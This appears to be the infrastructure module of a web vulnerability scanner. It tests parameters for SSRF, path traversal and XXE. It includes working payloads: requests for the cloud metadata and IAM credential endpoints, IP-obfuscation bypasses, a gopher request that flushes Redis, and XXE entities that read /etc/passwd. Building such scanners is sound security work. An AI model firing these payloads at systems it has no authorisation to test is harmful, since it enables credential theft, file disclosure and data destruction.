# scanner/dast/modules/infra.py
#
# AGGRESSIVE INFRA MODULE — SSRF with bypass chains, LFI with encoding mutations,
# XXE via POST, and OAST blind detection

import asyncio
import logging
import urllib.parse
from scanner.dast.payloads import LFI_PAYLOADS, SSRF_PAYLOADS, XXE_PAYLOADS

logger = logging.getLogger(__name__)

SSRF_PROBE_PARAMS = frozenset({
    "url", "uri", "link", "src", "source", "dest", "destination",
    "redirect", "path", "fetch", "load", "file", "resource",
    "host", "target", "endpoint", "proxy", "request", "href", "callback",
    "img", "image", "domain", "site", "page", "reference", "return",
    "next", "goto", "out", "feed", "rss", "api", "query",
})

SSRF_TARGETS = [
    # Cloud metadata
    ("AWS",           "http://169.254.169.254/latest/meta-data/",                {}),
    ("AWS IAM",       "http://169.254.169.254/latest/meta-data/iam/security-credentials/", {}),
    ("GCP",           "http://metadata.google.internal/computeMetadata/v1/",     {"Metadata-Flavor": "Google"}),
    ("GCP Token",     "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token", {"Metadata-Flavor": "Google"}),
    ("Azure",         "http://169.254.169.254/metadata/instance?api-version=2021-02-01", {"Metadata": "true"}),
    ("DigitalOcean",  "http://169.254.169.254/metadata/v1/",                     {}),
    ("Alibaba",       "http://100.100.100.200/latest/meta-data/",                {}),
    # Internal services
    ("Redis",         "http://127.0.0.1:6379",                                   {}),
    ("Elasticsearch", "http://127.0.0.1:9200",                                   {}),
    ("Elasticsearch", "http://127.0.0.1:9200/_cluster/health",                   {}),
    ("MongoDB",       "http://127.0.0.1:27017",                                  {}),
    ("MySQL",         "http://127.0.0.1:3306",                                   {}),
    ("PostgreSQL",    "http://127.0.0.1:5432",                                   {}),
    ("Internal",      "http://localhost:80",                                      {}),
    ("Internal 443", "http://localhost:443",                                      {}),
    ("Internal 8080","http://localhost:8080",                                     {}),
    ("Internal 3000","http://localhost:3000",                                     {}),
    ("IPv6 Local",    "http://[::1]",                                             {}),
    # IP bypasses
    ("Decimal IP",    "http://2130706433",                                        {}),
    ("Hex IP",        "http://0x7f000001",                                        {}),
    ("Octal IP",      "http://0177.0.0.1",                                        {}),
    ("Zero IP",       "http://0/",                                               {}),
    ("Short IP",      "http://127.1/",                                            {}),
    # Protocol schemes
    ("File",          "file:///etc/passwd",                                        {}),
    ("Dict",          "dict://127.0.0.1:6379/info",                               {}),
    ("Gopher Redis",  "gopher://127.0.0.1:6379/_*1%0d%0a%248%0d%0aflushall%0d%0a", {}),
]

SSRF_INDICATORS = [
    "ami-id", "instance-id", "iam/security-credentials", "local-ipv4",
    "computeMetadata", "-ERR", "+PONG", "+OK",
    "mongodb", "elasticsearch", "localhost", "cluster_name",
    "redis_version", "total_in_bytes", "tag:",
    "private-ipv4", "hostname", "local-hostname",
]

LFI_INDICATORS = [
    "root:x:", "root:0:0", "daemon:", "nobody:", "bin/bash", "bin/sh",
    "www-data", "[boot loader]", "[fonts]", "PHP Version", "phpinfo()",
]

# XXE content types to try
XML_CONTENT_TYPES = [
    "text/xml",
    "application/xml",
    "application/soap+xml",
    "application/rss+xml",
]


class InfraModule:
    def __init__(self, scanner):
        self.scanner = scanner

    async def run(self, client, url: str, params: list) -> None:
        tasks = []
        for param in params:
            tasks.append(self.test_lfi(client, url, param))
            tasks.append(self.test_ssrf(client, url, param))
        # Also test XXE on all POST-accepting endpoints
        tasks.append(self.test_xxe(client, url))
        await asyncio.gather(*tasks, return_exceptions=True)

    async def test_ssrf(self, client, url: str, param: str) -> None:
        if param.lower() not in SSRF_PROBE_PARAMS:
            return

        # OAST blind detection (if configured)
        if self.scanner.oast:
            oast_url  = f"http://{self.scanner.oast.domain}/ssrf_{param}"
            probe_url = self.scanner.param_engine.inject_payload(url, param, oast_url)
            await self.scanner._req(client, "GET", probe_url, timeout=15)

        # Inline response-based detection
        for provider, target, extra_headers in SSRF_TARGETS:
            test_url = self.scanner.param_engine.inject_payload(url, param, target)
            res = await self.scanner._req(client, "GET", test_url, headers=extra_headers, timeout=15)
            if res and res.status_code == 200:
                body = res.text.lower()
                for ind in SSRF_INDICATORS:
                    if ind.lower() in body:
                        self.scanner._add_finding({
                            "type": "SSRF", "subtype": f"Cloud/Internal Resource ({provider})",
                            "url": test_url, "parameter": param, "payload": target,
                            "severity": "Critical", "confidence": 0.92,
                            "evidence": f"Indicator '{ind}' in response",
                            "description": (
                                f"Parameter '{param}' fetched internal resource '{target}'. "
                                f"Attacker can access cloud metadata or pivot to internal services."
                            ),
                        })
                        return

    async def test_lfi(self, client, url: str, param: str) -> None:
        # Get baseline to avoid false positives
        baseline = await self.scanner._req(client, "GET", url)
        baseline_text = baseline.text if baseline else ""

        for payload in LFI_PAYLOADS:
            # Also try URL-encoded variants
            for mutated in [payload, urllib.parse.quote(payload)]:
                test_url = self.scanner.param_engine.inject_payload(url, param, mutated)
                res = await self.scanner._req(client, "GET", test_url)
                if not res:
                    continue
                for ind in LFI_INDICATORS:
                    if ind in res.text and (not baseline_text or ind not in baseline_text):
                        self.scanner._add_finding({
                            "type": "Local File Inclusion (LFI)", "subtype": "Path Traversal",
                            "url": test_url, "parameter": param, "payload": mutated,
                            "severity": "Critical", "confidence": 0.95,
                            "evidence": f"File marker '{ind}' found",
                            "description": f"Parameter '{param}' allows reading server files via path traversal.",
                        })
                        return

    async def test_xxe(self, client, url: str) -> None:
        """Test for XXE by POSTing XML payloads with various content types."""
        xxe_payloads = [
            # Classic file read
            ('<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>'
             '<root><data>&xxe;</data></root>',
             ["root:x:", "root:0:0", "daemon:", "nobody:"],
             "File read via XXE"),
            # Windows file read
            ('<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]>'
             '<root><data>&xxe;</data></root>',
             ["[fonts]", "[extensions]", "for 16-bit"],
             "Windows file read via XXE"),
            # SSRF via XXE
            ('<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]>'
             '<root><data>&xxe;</data></root>',
             ["ami-id", "instance-id", "local-ipv4"],
             "SSRF to cloud metadata via XXE"),
        ]

        for content_type in XML_CONTENT_TYPES:
            for payload, indicators, description in xxe_payloads:
                try:
                    res = await self.scanner._req(
                        client, "POST", url,
                        content=payload,
                        headers={"Content-Type": content_type},
                        timeout=15,
                    )
                    if not res or res.status_code in (404, 415, 405):
                        continue

                    for indicator in indicators:
                        if indicator.lower() in res.text.lower():
                            self.scanner._add_finding({
                                "type": "XML External Entity (XXE)", "subtype": description,
                                "url": url, "parameter": "request_body",
                                "payload": payload[:120] + "...",
                                "severity": "Critical", "confidence": 0.95,
                                "evidence": f"Indicator '{indicator}' found — {description}",
                                "description": f"Endpoint parses external XML entities. {description}",
                            })
                            return
                except Exception as e:
                    logger.debug(f"XXE test error at {url}: {e}")
